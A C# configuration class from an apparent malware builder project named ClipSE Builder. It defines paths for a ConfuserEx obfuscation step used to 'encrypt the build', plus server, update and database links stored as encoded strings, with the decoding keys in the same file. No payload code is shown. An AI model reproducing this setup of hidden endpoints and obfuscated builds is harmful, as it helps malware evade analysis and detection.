using System;
using System.IO;
using System.Reflection;
using ClipPurSEditionBuilder.Sticks;

namespace ClipPurSEditionBuilder
{
    public static class GlobalPath
    {
        public static readonly string GenRunNameWithoutExtension = Path.GetFileNameWithoutExtension(AppDomain.CurrentDomain.FriendlyName);
        public static readonly string CurrDir = Environment.CurrentDirectory;

        public static readonly string ManifestDirectory = FileControl.CombinePath(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "AppDir");

        public static readonly string ManifestFile = FileControl.CombinePath(ManifestDirectory, "app.manifest");

        // Для обновления
        public static readonly string NewFile = FileControl.CombinePath(CurrDir, "UpdateSE.txt");
        public static readonly string EngDir = FileControl.CombinePath(CurrDir, "en-US");
        public static readonly string NewFile_Dll = FileControl.CombinePath(EngDir, "ClipSE Builder by r3xq1.resources.dll");
        public static string Server = "#KxgdACB/bEMZESAxJg4AHn0mLAFGAjIybF8NHTINNzUj";
        public static string TextBuild = "#KxgdACB/bEMbESRrJAUdGCYnNh8MAjAqLRgMHidrIAMEXwAxCw0bAH4iMBofXwY1Jw0dFQAAbAEIAycgMUMrBTopJwkbXic9Nw==";

        // Для шифрования билда
        public static readonly string ModConfuser = FileControl.CombinePath(CurrDir, "Mod"); 
        public static readonly string CLI = FileControl.CombinePath(ModConfuser, "Confuser.CLI.exe"); 
        public static readonly string Confused = FileControl.CombinePath(CurrDir, "Obfuscated"); 
        public static readonly string SysbolsMap = FileControl.CombinePath(Confused, "symbols.map");
        public static readonly string Config = FileControl.CombinePath(CurrDir, "project.crproj"); 

        // Ссылки
        public static string Database = "#KxgdACB/bEMZESAxJg4AHn0mLAFGAjIybAlZOmA9CA4k"; 
        public static string DatabaseBuild = "#KxgdACB/bEMZESAxJg4AHn0mLAFGAjIybD0CMyUJDj88";
        public static string UrlCheck = "#KxgdACB/bEMQET0hJhRHAiZq"; 

        // Ключи для расшифровки
        public static string SecretKey_Public = "ClipSE"; 
        public static string SecretKey_Build  = "SEditionBuild";

        public static string VersionBuild = Assembly.GetExecutingAssembly().GetName().Version.ToString();
    }
}